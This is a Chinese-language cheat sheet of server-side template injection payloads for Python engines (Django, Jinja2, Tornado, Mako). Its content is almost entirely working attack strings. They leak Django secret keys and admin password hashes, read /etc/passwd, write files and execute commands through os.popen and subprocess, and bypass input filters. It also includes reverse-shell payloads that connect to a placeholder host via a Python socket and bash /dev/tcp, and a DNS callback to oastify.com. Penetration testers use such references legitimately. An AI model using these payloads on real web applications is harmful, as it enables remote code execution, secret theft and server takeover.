[原文文档](Python.en.md)

# 服务器端模板注入 - Python

> 服务器端模板注入（SSTI）是一种漏洞，发生在攻击者可以将恶意输入注入服务器端模板中，导致在服务器上执行任意代码。在Python中，当使用模板引擎（如Jinja2、Mako或Django模板）时，如果用户输入包含在模板中而没有适当的清理，就会出现SSTI。

## 概述

- [模板库](#模板库)
- [Django](#django)
    - [Django - 基本注入](#django---基本注入)
    - [Django - 跨站脚本攻击](#django---跨站脚本攻击)
    - [Django - 调试信息泄露](#django---调试信息泄露)
    - [Django - 泄露应用程序密钥](#django---泄露应用程序密钥)
    - [Django - 管理员站点URL泄露](#django---管理员站点url泄露)
    - [Django - 管理员用户名和密码哈希泄露](#django---管理员用户名和密码哈希泄露)
- [Jinja2](#jinja2)
    - [Jinja2 - 基本注入](#jinja2---基本注入)
    - [Jinja2 - 模板格式](#jinja2---模板格式)
    - [Jinja2 - 调试语句](#jinja2---调试语句)
    - [Jinja2 - 转储所有使用的类](#jinja2---转储所有使用的类)
    - [Jinja2 - 转储所有配置变量](#jinja2---转储所有配置变量)
    - [Jinja2 - 读取远程文件](#jinja2---读取远程文件)
    - [Jinja2 - 写入远程文件](#jinja2---写入远程文件)
    - [Jinja2 - 远程命令执行](#jinja2---远程命令执行)
        - [在盲RCE上强制输出](#jinja2---在盲rce上强制输出)
        - [通过调用os.popen().read()利用SSTI](#通过调用ospopenread利用ssti)
        - [通过调用subprocess.Popen利用SSTI](#通过调用subprocesspopen利用ssti)
        - [通过调用Popen而不猜测偏移量利用SSTI](#通过调用popen而不猜测偏移量利用ssti)
        - [通过编写恶意配置文件利用SSTI](#通过编写恶意配置文件利用ssti)
    - [Jinja2 - 过滤器绕过](#jinja2---过滤器绕过)
- [Tornado](#tornado)
    - [Tornado - 基本注入](#tornado---基本注入)
    - [Tornado - 远程命令执行](#tornado---远程命令执行)
- [Mako](#mako)
    - [Mako - 远程命令执行](#mako---远程命令执行)
- [参考资料](#参考资料)

## 模板库

| 模板名称 | 负载格式 |
| ------------ | --------- |
| Bottle    | `{{ }}`  |
| Chameleon | `${ }`   |
| Cheetah   | `${ }`   |
| Django    | `{{ }}`  |
| Jinja2    | `{{ }}`  |
| Mako      | `${ }`   |
| Pystache  | `{{ }}`  |
| Tornado   | `{{ }}`  |

## Django

Django模板语言默认支持2个渲染引擎：Django Templates（DT）和Jinja2。Django Templates是一个更简单的引擎。它不允许调用传递的对象函数，SSTI在DT中的影响通常比在Jinja2中要轻。

### Django - 基本注入

```python
{% csrf_token %} # 在Jinja2中导致错误
{{ 7*7 }}  # 在Django Templates中出错
ih0vr{{364|add:733}}d121r # Burp负载 -> ih0vr1097d121r
```

### Django - 跨站脚本攻击

```python
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```

### Django - 调试信息泄露

```python
{% debug %}
```

### Django - 泄露应用程序密钥

```python
{{ messages.storages.0.signer.key }}
```

### Django - 管理员站点URL泄露

```python
{% include 'admin/base.html' %}
```

### Django - 管理员用户名和密码哈希泄露

```ps1
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}

{% get_admin_log 10 as admin_log for_user user %}
```

---

## Jinja2

[官方网站](https://jinja.palletsprojects.com/)
> Jinja2是Python的功能齐全的模板引擎。它具有完整的unicode支持，可选的集成沙盒执行环境，广泛使用且采用BSD许可。  

### Jinja2 - 基本注入

```python
{{4*4}}[[5*5]]
{{7*'7'}} 将导致7777777
{{config.items()}}
```

Jinja2被Django或Flask等Python Web框架使用。
上述注入已在Flask应用程序上进行了测试。

### Jinja2 - 模板格式

```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}

```

### Jinja2 - 调试语句

如果启用了调试扩展，则`{% debug %}`标签将可用于转储当前上下文以及可用的过滤器和测试。这对于查看模板中可用什么而不设置调试器很有用。

```python
<pre>{% debug %}</pre>

来源：[jinja.palletsprojects.com](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)

### Jinja2 - 转储所有使用的类

```python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

访问`__globals__`和`__builtins__`：

```python
{{ self.__init__.__globals__.__builtins__ }}
```

### Jinja2 - 转储所有配置变量

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

### Jinja2 - 读取远程文件

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File类
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### Jinja2 - 写入远程文件

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

### Jinja2 - 远程命令执行

监听连接

```bash
nc -lnvp 8000
```

#### Jinja2 - 在盲RCE上强制输出

你可以导入Flask函数来从易受攻击的页面返回输出。

```py
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
")
}}
```

#### 通过调用os.popen().read()利用SSTI

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

但是当`__builtins__`被过滤时，以下负载是上下文无关的，不需要任何东西，除了在jinja2 Template对象中：

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

我们可以使用来自[@podalirius_](https://twitter.com/podalirius_)的这些较短负载：[python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/)：

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

使用[objectwalker](https://github.com/p0dalirius/objectwalker)我们可以从`lipsum`找到到`os`模块的路径。这是在Jinja2模板中实现RCE的已知最短负载：

```python
{{ lipsum.__globals__["os"].popen('id').read() }}
```

#### 通过调用subprocess.Popen利用SSTI

:warning: 数字396会根据应用程序而变化。

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

#### 通过调用Popen而不猜测偏移量利用SSTI

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

来自[@SecGus](https://twitter.com/SecGus/status/1198976764351066113)的负载的简单修改，以清理输出并便于命令输入。在另一个GET参数中包含名为"input"的变量，其中包含你要运行的命令（例如：&input=ls）

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```

#### 通过编写恶意配置文件利用SSTI

```python
# 恶意配置
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# 加载恶意配置
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# 连接到恶意主机
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```

### Jinja2 - 过滤器绕过

```python
request.__class__
request["__class__"]
```

绕过`_`

```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

绕过`[`和`]`

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

绕过`|join`

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

绕过最常见的过滤器（'.'、'_'、'|join'、'['、']'、'mro'和'base'）通过[@SecGus](https://twitter.com/SecGus)：

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

---

## Tornado

### Tornado - 基本注入

```py
{{7*7}}
{{7*'7'}}
```

### Tornado - 远程命令执行

```py
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

---

## Mako

[官方网站](https://www.makotemplates.org/)
> Mako是用Python编写的模板库。从概念上讲，Mako是一种嵌入式Python（即Python服务器页面）语言，它完善了组件化布局和继承的熟悉思想，以产生最直接和灵活的模型之一，同时还与Python调用和作用域语义保持密切联系。

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

### Mako - 远程命令执行

这些负载中的任何一个都允许直接访问`os`模块

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

PoC：

```python
>>> print(Template("${self.module.cache.util.os}").render())
<module 'os' from '/usr/local/lib/python3.10/os.py'>
```

## 参考资料

- [备忘单 - Flask & Jinja2 SSTI - phosphore - 2018年9月3日](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
- [在Flask/Jinja2中探索SSTI，第二部分 - Tim Tomes - 2016年3月11日](https://web.archive.org/web/20170710015954/https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
- [Jinja2模板注入过滤器绕过 - Sebastian Neef - 2017年8月28日](https://0day.work/jinja2-template-injection-filter-bypasses/)
- [Mako模板中的Python上下文无关负载 - podalirius - 2021年8月26日](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)
- [语法之间的雷区：在野外利用语法混淆 - YesWeHack - 2025年10月17日](https://www.yeswehack.com/learn-bug-bounty/syntax-confusion-ambiguous-parsing-exploits)